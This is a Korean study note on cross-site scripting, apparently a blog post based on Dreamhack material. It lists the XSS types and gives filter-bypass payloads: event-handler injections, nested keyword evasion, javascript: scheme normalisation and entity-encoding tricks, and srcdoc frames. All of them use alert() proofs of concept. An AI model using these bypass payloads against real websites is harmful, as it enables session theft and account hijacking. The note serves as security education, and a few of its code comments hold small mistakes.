# **XSS란?**

<br>

### **XSS(Cross-site-scripting)** 는 클라이언트 사이드 취약점 중 하나로, 공격자가 **웹 리소스에 악성 스크립트를 삽입**해 타 사용자의 웹 브라우저에서 해당 스크립트가 실행되는 취약점이다.

### 공격자는 해당 취약점을 통해 특정 계정의 세션 정보를 탈취하고, 해당 계정으로 임의의 기능을 수행할 수 있다.

<br>

- - -

<br>

## **XSS의 종류**

<br>

* ### **Stored XSS**
  XSS에 사용되는 악성 스크립트가 서버에 저장되고, 서버의 응답에 잠겨오는 XSS. 예시로, 게시글과 댓글 등이 대표적이다.
  <br>

* ### **Reflected XSS**
  XSS에 사용되는 악성 스크립트가 URL에 삽입되고 서버의 응답에 담겨오는 XSS
  <br>

* ### **DOM-based XSS**
  XSS에 사용되는 악성 스크립트가 URL Fragment에 삽입되는 XSS
  <br>

* ### **Universal XSS**
  클라이언트의 브라우저 혹은 브라우저의 플러그인에서 발생하는 취약점으로 SOP 정책을 우회하는 XSS

<br><br>

---

## **XSS Filtering 우회**

<br>

+ ### **onload 이벤트 핸들러**

<br>

  ```html
  <img src = "https://dreamhack.io/valid.jpg" onload="alert(document.domain)">
  <!-- 유효한 이미지 로드 시 onload 핸들러 실행> -->

  <img src = "https://dreamhack.io/invalid.jpg" onload="alert(document.domain)">
  <!-- 이미지 로드 실패 시 onload 핸들러 실행하지 않음> -->
  ```

  <br>

+ ### **onerror 이벤트 핸들러**
  
  <br>

    ```html
  <img src = "https://dreamhack.io/valid.jpg" onerror="alert(document.domain)">
  <!-- 유효한 이미지 로드 시 onerror 핸들러 실행하지 않음> -->

  <img src = "https://dreamhack.io/invalid.jpg" onload="alert(document.domain)">
  <!-- 이미지 로드 실패 시 onerror 핸들러 실행하함> -->
  ```

  <br>

+ ### **onfocus 이벤트 핸들러**

  <br>

  ```html
  <input type = "text" id = "inputID" onfocus="alert(document.domain)" autofocus>
  <!-- autofocus 속성으로 인해 페이지가 로드되자 마자 바로 input 태그에 포커스를 한다.
  포커스될 시 onfocus 핸들러 실행
  -->
  ```

  <br>

+ ### **문자열 치환**
  
<br>

XSS 키워드를 필터링할 때 의심되는 구문을 거부하는 대신, 단순히 치환이나 제거하는 방식의 필터링 방법이 있다.

<br>

만약 단순히 의심되는 구문을 제거할 경우, 필터링되는 키워드 사이에 새로운 필터링 키워드를 삽입하는 것으로 우회가 가능하다.

<br>

```html
(x => x.replace(/onerror/g, ''))
('<img onerroronerror=promonerrorpt(1)>') -- > <img onerror=prompt(1) />
```

<br><br>

### **활성 하이퍼링크**

<br>

HTML 마크업에서 `javascript:` 스키마는 URL 로드 시 자바스킯트 코드를 실행할 수 있도록 하는데, `a`태그나 `iframe`태그 등에 사용할 수 있다.  

<br>

```html
<a href = "javascript:alert(document.domain)">Click me!</a>

<iframe src="javascript:alert(document.domain)">
```

<br>

이런 방법때문에, `javascript:`스키마를 사용하짐지 못하도록 필터링하는 경우가 있는데, 이 경우에는 브라우저들이 URL을 사용할 떄 거치는 과정 중 하나인 정규화(Normalization)을 이용해 우회할 수 있다.

<br>

```html
<a href="\1\4jAVasC\triPT:alert(document.domain)">Click me!</a>
```

<br>

또, HTML 태그의 속성 중 HTML Entity Encoding을 사용할 수 있는데 이를 이용해 `javscript:`스키마나 이 외의 XSS 키워드를 인코딩하여 필터링을 우회하는 방법도 있다.

<br>

```html
<a href = "\1&#4;J&#97;v&#x61;sCr\tip&tab;&colon;alert(document.domain);">Cliek me!</a>

<iframe src="\1&#4;J&#97;v&#x61;sCr\tip&tab;&colon;alert(document.domain);">
```

<br><br>

### **태그와 속성 기반 필터링**

<br>

단순히 태그나 속성을 바탕으로 필터링을 하게 되면 우회가 가능한 경우가 많다. 아래는 취약한 필터링의 예시이다.

<br>

#### **대문자 혹은 소문자만을 인식하는 필터 우회**
특정 키워드의 대소문자를 모두 검사하지 않을 경우 우회할 수 있다.

<br>

#### **잘못된 정규표현식을 사용한 필터 우회**
일반적으로 키워드를 필터링할 때 정규표현식(Regex Expression)을 이용하는데, 정규표현식 필터링 자체에 문제가 있는 경우 **정규표현식을 만족하면서 XSS 공격 구문을 삽입**할 수 있다.

<br>

#### **특정 태그 및 속성에 대한 필터링을 다른 태그 및 속성을 이용하여 필터 우회**
HTML 내엔 다양한 종류의 태그와 속성이 존재하는데, 즉 XSS 공격을 할 떄 보편적으로 사용하는 `script`, `img`, `input`, `iframe` 등의 태그가 막힌다고 모든 XSS 공격을 막을 수 있는 것은 아니다.


<br>

```html
<video><source onerror="alert(document.domain)"/>

<body onload="alert(document.domain)"/>

```

또한, `iframe` 태그의 `src` 속성은 URL을 인자로 받기 때문에, 하이퍼링크를 이용해 javascript 코드를 삽입 가능하며 `srcdoc`을 이용해 inner frame 내에 새로운 XSS 공격 코드를 입력할 수도 있다.

<br>

```html
<iframe src="javascript:alert(parent.document.domain)">

<iframe srcdoc="<&#x69;mg src=1 &#x6f;nerror=alert(parent.document.domain)>">
```